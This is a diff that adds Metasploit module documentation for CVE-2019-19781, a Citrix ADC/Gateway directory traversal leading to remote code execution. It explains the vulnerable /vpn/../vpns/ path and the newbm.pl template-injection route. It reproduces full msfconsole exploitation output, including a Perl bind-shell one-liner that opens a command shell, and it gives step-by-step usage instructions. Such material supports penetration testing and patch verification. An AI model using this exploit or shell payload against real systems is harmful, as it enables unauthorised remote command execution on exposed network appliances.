@@ -1,0 +1,76 @@
+## Introduction
+
+A directory traversal was discovered in Citrix Application Delivery Controller (ADC), aka NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0.
+
+When the NSPPE receives a request for `GET /vpn/index.html`, it is supposed to send this request to Apache, which processes it. However, by making the request `GET /vpn/../vpns/` (which is not sanitized), Apache transforms the route into `GET /vpns/` and processes this last request normally.
+
+This `/vpns/` directory is interesting because it contains Perl code. The script `newbm.pl` creates an array containing information from several parameters, then calls the `filewrite` function, which writes the content to an XML file on disk.
+
+A malicious attacker can execute arbitrary commands remotely by creating a corrupted XML file that uses the Perl Template Toolkit in part of payload.
+
+```
+msf5 exploit(linux/http/citrix_dir_traversal_rce) > run
+
+[*] Using auxiliary/scanner/http/citrix_dir_traversal as check
+[+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.
+[+] Obtained HTTP response code 200 for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpn/../vpns/cfg/smb.conf was obtained via directory traversal.
+[*] Scanned 1 of 1 hosts (100% complete)
+[+] The target appears to be vulnerable
+[*] Yeeting cmd/unix/generic payload at 127.0.0.1:8080
+[*] Generated payload: id
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+
+[!] This exploit may require manual cleanup of '/netscaler/portal/templates/mdjLHiHtIYmh.xml' on the target
+[!] This exploit may require manual cleanup of '/var/tmp/netscaler/portal/templates/mdjLHiHtIYmh.xml.ttc2' on the target
+[*] Exploit completed, but no session was created.
+msf5 exploit(linux/http/citrix_dir_traversal_rce) > set payload cmd/unix/bind_perl
+payload => cmd/unix/bind_perl
+msf5 exploit(linux/http/citrix_dir_traversal_rce) > run
+
+[*] Using auxiliary/scanner/http/citrix_dir_traversal as check
+[+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.
+[+] Obtained HTTP response code 200 for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpn/../vpns/cfg/smb.conf was obtained via directory traversal.
+[*] Scanned 1 of 1 hosts (100% complete)
+[+] The target appears to be vulnerable
+[*] Yeeting cmd/unix/bind_perl payload at 127.0.0.1:8080
+[*] Generated payload: perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'
+[!] No response to GET KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml request
+[*] Started bind TCP handler against 127.0.0.1:4444
+[*] Command shell session 1 opened (127.0.0.1:51106 -> 127.0.0.1:4444) at 2020-01-13 20:50:45 -0600
+[+] Deleted /netscaler/portal/templates/KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml
+[+] Deleted /var/tmp/netscaler/portal/templates/KdlZHSNjZQzdSCKAusgAnnbPvTMLhXRxiEydEotJP.xml.ttc2
+
+id
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+```
+
+## Verification Steps
+
+1. Install the module as usual
+2. Start msfconsole
+3. Do: `use exploit/linux/http/citrix_dir_traversal_rce`
+4. Do: `set RHOSTS [IP]`
+5. Do: `set LHOST [IP]`
+6. Do: `set VERBOSE true`
+7. Do: `run`
+
+## Targets
+
+```
+Id  Name
+--  ----
+0   Python
+1   Unix Command
+```
+
+## Advanced options
+
+**ForceExploit**
+
+Override check result.
+
+## References
+
+1. <https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/>
+2. <https://www.exploit-db.com/exploits/47901>
+3. <https://www.exploit-db.com/exploits/47902>
